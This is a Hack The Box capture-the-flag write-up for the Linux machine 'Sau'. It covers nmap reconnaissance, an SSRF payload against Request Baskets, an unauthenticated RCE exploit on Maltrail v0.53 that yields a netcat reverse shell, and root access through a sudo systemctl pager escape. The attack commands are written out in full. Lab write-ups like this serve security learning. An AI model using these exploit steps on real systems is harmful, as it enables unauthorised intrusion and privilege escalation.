## Overview
Sau is an easy rated Linux machine on Hack The Box that is vulnerable to an SSRF exploit, and unauthorised RCE through a vulnerable internal web service.

## Recon
Firstly, we start by running an nmap scan on the target IP with the command: `nmap -vv -Pn -T4 -sCV [target IP]`
- `-vv` to increase nmap scan verbosity
- `-Pn` to disable host discovery
- `-T4` to increase scan speed
- `-sCV` to enumerate service version/information and enable common script scans

```
/Downloads/htb/Sau ❯ nmap -vv -Pn -T4 -sCV 10.10.11.224
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 18:35 AEST

```
From our Nmap scan, we can see that there are three open ports: 22, 80 and 55555. Port 80 is filtered with no response from the scan, and is inaccessible via web browser (which tells me that it may be an SSRF exploit, or may require port forwarding after gaining low level system access).

## Port 55555
We'll move onto exploring port 55555, and discover that it is accessible via web browser, and displays the Request Baskets web application.
![Request Baskets page](../../../assets/img/Sau/RequestBaskets-webpage.png)
The first step here is to search Google for Request Baskets exploits. Our search reveals the following page with an SSRF exploit POC:
[request-baskets SSRF details - CodiMD (sjtu.edu.cn)](https://notes.sjtu.edu.cn/s/MUUhEymt7).

Reading this page shows that Request Baskets is indeed vulnerable to SSRF:
![Request Baskets exploit payload](../../../assets/img/Sau/exploit-1.png)
Following the instructions on this page, we will open Burp Suite, then create a new basket on the Request Baskets page and capture the HTML request.
We will however change parts of the payload to be: 
- `"forward_url": "http://127.0.0.1:80"` 
- `"proxy_response": true`

which will forward the web application at `http://127.0.0.1:80` to us in the web browser.

We then open the newly created basket and are presented with a URL that is configured to respond with our custom payload.
![Exploit basket](../../../assets/img/Sau/exploit-basket.png)

If we visit this URL (`http://10.10.11.224:55555/exploit`) in our web browser, we can see that we have been redirected to a new web page: the web application located at port 80, that was inaccessible to us earlier.
![Maltrail page](../../../assets/img/Sau/maltrail-page.png)

We now need to run a Google search for Maltrail v0.53 exploits. The search leads us to the page: [spookier/Maltrail-v0.53-Exploit (github.com)](https://github.com/spookier/Maltrail-v0.53-Exploit) and a POC for an unauthenticated RCE exploit.
We then download the exploit python file and run it from our local terminal, while listening on the chosen port (1234 in this instance):

```
~/Downloads/htb/Sau ❯ python3 maltrail.py 10.10.14.35 1234 http://10.10.11.224:55555/test/login
Running exploit on http://10.10.11.224:55555/test/login
```

```
~/Downloads/htb/Sau ❯ nc -nlvp 1234                                           1m 16s 21:03:41
listening on [any] 1234 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.224] 42822
$ id 
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```
As we can see, we've received a reverse shell as a low level user "Puma".
We can upgrade to a fully interactive shell using:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then navigate to the /home/puma/ folder and get the user flag:

```
puma@sau:/opt/maltrail$ cd
cd
puma@sau:~$ ls -lah
ls -lah

drwxr-xr-x 4 puma puma 4.0K Jun 19 12:25 .

-rw-r----- 1 root puma   33 Aug  4 04:51 user.txt
puma@sau:~$ cat user.txt
```
## Privilege Escalation
Our focus now switches to privilege escalation so that we can gain administrative permissions on the system.
We could transfer and run the Linpeas script, but it is a good idea to test some simple PrivEsc techniques first.
Running `sudo -l` reveals that user puma can run a command as root:

```
puma@sau:~$ sudo -l 
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
This is a promising vector, and a visit to the [Systemctl page at GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) explains the simplicity of privilege escalation in this situation (Sudo, section (c)).
When we run `sudo /usr/bin/systemctl status trail.service`, we can see that it is printed with a pager (like the less binary), which we can escape into an elevated shell with `!sh`:

```
puma@sau:~$ sudo /usr/bin/systemctl status trail.service

We have root!

We can now navigate to the root user's home folder and get the root flag:

```
# cd /root
cd /root
# ls     
ls
go  root.txt
# cat root.txt
```

Done!
